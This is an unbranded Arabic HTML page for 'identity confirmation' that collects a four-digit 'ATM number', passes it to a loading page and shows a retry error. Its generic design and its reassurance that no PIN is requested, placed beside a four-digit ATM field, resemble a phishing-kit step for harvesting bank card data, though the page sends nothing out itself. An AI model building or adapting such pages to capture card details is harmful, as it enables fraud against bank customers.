<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأكيد الهوية</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&family=IBM+Plex+Sans+Arabic:wght@400;500;600&display=swap');

  :root{
    --bg: #FFFFFF;
    --card: #FFFFFF;
    --card-border: #E5E7EE;
    --accent: #A11E1E;
    --accent-soft: rgba(161,30,30,0.08);
    --text: #1B1F2A;
    --muted: #7A8194;
    --error: #D14343;
    --success: #2F9E6B;
  }

  *{ box-sizing: border-box; }

  body{
    margin:0;
    min-height:100vh;
    background: var(--bg);
    font-family: 'IBM Plex Sans Arabic', sans-serif;
    color: var(--text);
    display:flex;
    align-items:center;
    justify-content:center;
    padding: 24px;
  }

  .card{
    width:100%;
    max-width: 400px;
    background: var(--card);
    border: 1px solid var(--card-border);
    border-radius: 20px;
    padding: 36px 30px 30px;
    position: relative;
    overflow: hidden;
    box-shadow: 0 8px 30px rgba(20,20,30,0.06);
  }

  .card::before{
    content:"";
    position:absolute;
    top:0; right:0; left:0;
    height:3px;
    background: linear-gradient(90deg, var(--accent), transparent 70%);
  }

  .icon-id{
    width:52px; height:52px;
    border-radius: 14px;
    background: var(--accent-soft);
    display:flex; align-items:center; justify-content:center;
    margin-bottom: 22px;
  }

  h1{
    font-family: 'Tajawal', sans-serif;
    font-weight: 900;
    font-size: 24px;
    margin: 0 0 8px;
    line-height: 1.4;
  }

  p.sub{
    color: var(--muted);
    font-size: 14.5px;
    line-height: 1.7;
    margin: 0 0 26px;
  }

  label{
    display:block;
    font-size: 13.5px;
    font-weight: 600;
    color: var(--text);
    margin-bottom: 8px;
  }

  .field-wrap{
    position:relative;
    margin-bottom: 18px;
  }

  .field-wrap .prefix{
    position:absolute;
    right: 16px;
    top: 50%;
    transform: translateY(-50%);
    color: var(--muted);
    font-size: 15px;
    font-variant-numeric: tabular-nums;
    letter-spacing: 2px;
  }

  input.last4{
    width:100%;
    padding: 14px 16px;
    font-size: 18px;
    font-weight: 700;
    letter-spacing: 8px;
    font-variant-numeric: tabular-nums;
    color: var(--text);
    background: #FAFAFC;
    border: 1.5px solid var(--card-border);
    border-radius: 12px;
    outline: none;
    text-align: center;
    transition: border-color .15s ease;
  }
  input.last4:focus{ border-color: var(--accent); }
  input.last4.error{ border-color: var(--error); animation: shake .35s ease; }

  @keyframes shake{
    25%{ transform: translateX(4px); }
    75%{ transform: translateX(-4px); }
  }

  label.dob{ margin-top: 4px; }
  input.dob-input{
    width:100%;
    padding: 14px 16px;
    font-size: 15px;
    color: var(--text);
    background: #FAFAFC;
    border: 1.5px solid var(--card-border);
    border-radius: 12px;
    outline: none;
    font-family: inherit;
    transition: border-color .15s ease;
  }
  input.dob-input:focus{ border-color: var(--accent); }

  .msg{
    font-size: 13.5px;
    min-height: 20px;
    margin: 4px 0 20px;
  }
  .msg.error{ color: var(--error); }
  .msg.success{ color: var(--success); }

  button.confirm{
    width:100%;
    padding: 14px;
    background: var(--accent);
    color: #FFFFFF;
    font-weight: 700;
    font-size: 15.5px;
    font-family: inherit;
    border:none;
    border-radius: 12px;
    cursor:pointer;
    transition: filter .15s ease, opacity .15s ease;
  }
  button.confirm:disabled{ opacity:.45; cursor:not-allowed; }
  button.confirm:not(:disabled):hover{ filter: brightness(1.1); }

  .note{
    display:flex;
    gap:8px;
    align-items:flex-start;
    margin-top: 18px;
    font-size: 12.5px;
    color: var(--muted);
    line-height: 1.6;
  }

  .success-state{
    display:none;
    text-align:center;
    padding: 20px 0 6px;
  }
  .success-state .check{
    width:56px; height:56px;
    border-radius: 50%;
    background: rgba(47,158,107,0.10);
    display:flex; align-items:center; justify-content:center;
    margin: 0 auto 18px;
  }
  .success-state h2{
    font-family:'Tajawal', sans-serif;
    font-size: 20px;
    margin: 0 0 6px;
  }
  .success-state p{
    color: var(--muted);
    font-size: 14px;
    margin:0;
  }

  .modal-overlay{
    display:none;
    position: fixed;
    inset: 0;
    background: rgba(20,20,25,0.45);
    align-items:center;
    justify-content:center;
    padding: 20px;
    z-index: 50;
  }
  .modal-overlay.show{ display:flex; }

  .modal-box{
    background: #fff;
    border-radius: 18px;
    padding: 30px 26px 26px;
    max-width: 340px;
    width:100%;
    text-align:center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.18);
    animation: pop .18s ease;
  }
  @keyframes pop{
    from{ transform: scale(.92); opacity:0; }
    to{ transform: scale(1); opacity:1; }
  }

  .modal-x{
    width: 56px; height:56px;
    border-radius: 50%;
    background: rgba(209,67,67,0.12);
    display:flex; align-items:center; justify-content:center;
    margin: 0 auto 16px;
  }

  .modal-box h3{
    font-family: 'Tajawal', sans-serif;
    font-size: 18px;
    margin: 0 0 8px;
    color: var(--text);
  }

  .modal-box p{
    font-size: 13.5px;
    color: var(--muted);
    line-height: 1.6;
    margin: 0 0 22px;
  }

  .modal-box button{
    width:100%;
    padding: 12px;
    background: var(--error);
    color:#fff;
    border:none;
    border-radius: 10px;
    font-family: inherit;
    font-weight: 700;
    font-size: 14.5px;
    cursor:pointer;
  }
  .modal-box button:hover{ filter: brightness(1.06); }
</style>
</head>
<body>

<div class="card">

  <div id="formState">
    <div class="icon-id">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
        <rect x="3" y="6" width="18" height="12" rx="2" stroke="#A11E1E" stroke-width="1.8"/>
        <circle cx="8.5" cy="11" r="1.6" stroke="#A11E1E" stroke-width="1.6"/>
        <path d="M6 15c.6-1.3 1.6-2 2.5-2s1.9.7 2.5 2" stroke="#A11E1E" stroke-width="1.6" stroke-linecap="round"/>
        <path d="M14 10.5h4M14 13.5h4" stroke="#A11E1E" stroke-width="1.6" stroke-linecap="round"/>
      </svg>
    </div>

    <h1>تأكيد الهوية</h1>

    <label>رقم ATM</label>
    <div class="field-wrap">
      <input type="text" class="last4" id="last4" inputmode="numeric" maxlength="4" placeholder="0000">
    </div>

    <div class="msg" id="msg"></div>

    <button class="confirm" id="confirmBtn" disabled>تأكيد الهوية</button>

    <div class="note">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" style="flex-shrink:0; margin-top:2px;">
        <circle cx="12" cy="12" r="9" stroke="#7A8194" stroke-width="1.6"/>
        <path d="M12 11v5M12 8v.01" stroke="#7A8194" stroke-width="1.6" stroke-linecap="round"/>
      </svg>
      <span>لن نطلب منك الرقم السري (PIN) أو رقم الكارت كاملاً في أي وقت.</span>
    </div>
  </div>

  <div class="success-state" id="successState">
    <div class="check">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
        <path d="M5 13l4 4L19 7" stroke="#2F9E6B" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <h2>تم تأكيد هويتك</h2>
    <p>جاري تحويلك الآن...</p>
  </div>

</div>

<div class="modal-overlay" id="errorModal">
  <div class="modal-box">
    <div class="modal-x">
      <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
        <path d="M6 6l12 12M18 6L6 18" stroke="#D14343" stroke-width="2.6" stroke-linecap="round"/>
      </svg>
    </div>
    <h3>رقم ATM غير صحيح</h3>
    <p>الرقم اللي أدخلته مش مطابق، من فضلك حاول مرة أخرى.</p>
    <button id="modalCloseBtn">حسنًا</button>
  </div>
</div>

<script>
  const last4Input = document.getElementById('last4');
  const confirmBtn = document.getElementById('confirmBtn');
  const msg = document.getElementById('msg');

  function checkFilled(){
    confirmBtn.disabled = last4Input.value.length !== 4;
  }

  last4Input.addEventListener('input', () => {
    last4Input.value = last4Input.value.replace(/[^0-9]/g, '');
    last4Input.classList.remove('error');
    msg.textContent = '';
    checkFilled();
  });

  confirmBtn.addEventListener('click', () => {
    if (last4Input.value.length === 4) {
      sessionStorage.setItem('atm_number', last4Input.value);
      window.location.href = 'atm-loading.html';
    } else {
      last4Input.classList.add('error');
      msg.textContent = 'من فضلك أدخل الأرقام بشكل صحيح';
      msg.className = 'msg error';
    }
  });

  document.getElementById('modalCloseBtn').addEventListener('click', () => {
    document.getElementById('errorModal').classList.remove('show');
    last4Input.value = '';
    last4Input.focus();
    confirmBtn.disabled = true;
  });

  // لو رجعنا من صفحة التحميل بسبب رقم خاطئ، تظهر نافذة الخطأ تلقائيًا
  if (new URLSearchParams(location.search).get('error') === '1') {
    last4Input.classList.add('error');
    document.getElementById('errorModal').classList.add('show');
  }
</script>

</body>
</html>
